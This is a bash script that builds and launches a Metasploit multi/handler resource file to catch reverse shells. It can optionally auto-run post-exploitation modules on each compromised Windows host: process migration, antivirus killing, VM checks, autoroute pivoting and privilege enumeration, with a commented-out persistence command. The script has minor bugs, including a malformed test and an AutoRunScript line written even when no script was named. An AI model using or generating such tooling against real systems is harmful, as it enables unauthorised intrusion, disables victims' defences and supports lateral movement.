#! /bin/bash

echo "//////////////////////////////////////////////////////"
echo "			Multi Handler"
echo "//////////////////////////////////////////////////////"

printf "This is a simple program that creates a resource file that can be used upon starting up with msfconsole"
printf "\n\n\n"

host="$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')" 
read -p "Please enter the port number that you will be listening to: [4444] " port
if [ -z $port ]
then
	port=4444
fi
printf "Preparing to generate the resource file...\n"


#wipe clean if exist
if [ -f multihandler.rc ]
then
	> multihandler.rc
	
fi

#Setting the handler module and filling its required field in the resource file
echo use multi/handler >> multihandler.rc
echo set lhost $host >> multihandler.rc
echo set lport $port >> multihandler.rc

#Adding autoscript to run after a machine is pwned [optional]
read -p "Do you want to automate the post exploitation phase?[y/n] " pe
if [ $pe = "y" ] || [ $pe = "Y"]
then
	read -p "name the post automation script name: " pas
	echo "adding basic post exploitation script into a new resource file"
	echo run post/windows/manage/migrate >> ~/$pas.rc
	#echo run persistence -X -i 30 -p $port -r $host >> ~/$pas.rc
	echo run post/windows/manage/killav >> ~/$pas.rc
	echo run post/windows/gather/checkvm >> ~/$pas.rc
	echo run post/multi/manage/autoroute >> ~/$pas.rc
	echo run post/windows/gather/win_privs >> ~/$pas.rc
	#echo run post/windows/gather/enum_domain >> ~/$pas.rc
fi

echo "setting the following script to autorun for handler to run when a shell is retrieved"
echo set AutoRunScript multi_console_command -r /root/$pas.rc>> multihandler.rc
echo exploit -j -z >> multihandler.rc

sleep 0.5s
read -p "Resource file generated, would you want to run the handler on a new terminal?[y/n] " mh
if [ $mh = "y" ] || [ $mh = "Y" ]
then
	printf "running multihandler on new terminal...\n\n"
	gnome-terminal -- msfconsole -r multihandler.rc
fi

printf "exiting....\n\n"

